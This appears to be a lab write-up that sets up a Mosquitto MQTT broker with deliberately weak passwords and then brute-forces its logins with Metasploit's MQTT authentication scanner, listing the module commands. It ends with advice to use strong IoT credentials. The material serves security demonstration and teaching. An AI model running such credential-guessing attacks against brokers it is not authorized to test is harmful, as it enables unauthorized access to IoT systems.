# MQTT Bruteforce

## Authentication Settings

First off, we need to remove anonymous authentication from the MQTT Broker. If needed, add these lines to the **mosquitto.conf** file : 

``` shell
password_file /mosquitto/passwd_file
allow_anonymous false
```

Then, we need to create a **passw_file** and add **username:password** encrypted combinations. Go into the docker cmd and run these commands :

***Create passwd_file*** :

```
mosquitto_passwd -c passwordfile user
```

This will add a user to the file. To set its password, run this command :

```
mosquitto_passwd -b passwordfile <user> <password>
```

We created three users : 

**admin:root**
**username:password**
**anna:spiderman**

## Metasploit

We will use a Metasploit payload to demonstrate that even beginners can hack poorly setup MQTT Brokers.

We will use the **MQTT Authentication Scanner** payload.
To use it, we simply need to give him some infos such as : 

**RHOST** : IP Address of the broker
**PASS_FILE** : file containing a list of passwords
**USERS_FILE** : file containing a list of usernames

You can find in this folder two files :

 - [pass.txt](https://github.com/user/repo/blob/branch/other_file.md)
 - [usernames.txt](https://github.com/user/repo/blob/branch/other_file.md)

#### Exploit

Start Metasploit using this command in a Linux Terminal :

```shell
msfconsole
```

Then, run these commands in Metasploit : 

```shell
use auxiliary/scanner/mqtt/connect
```

```shell
set PASS_FILE <your_password_file>
set USER_FILE <your_users_file>
set RHOSTS <broker_ip_address>
```

and then : 
``` shell
run
```

After a while, here is the result: (we stopped at the the first hit or it would take forever)

![mqtt sucesss](https://media.discordapp.net/attachments/469531451696742410/1138525348347265024/Pasted_image_20230808192512.png?width=1728&height=898 "mqtt sucesss")

### Conclusion

There's no security against Brute Force on IOT Devices credentials. You can either secure your devices placing them behind Firewalls and WAF, but you **MUST** use strong IOT Credentials.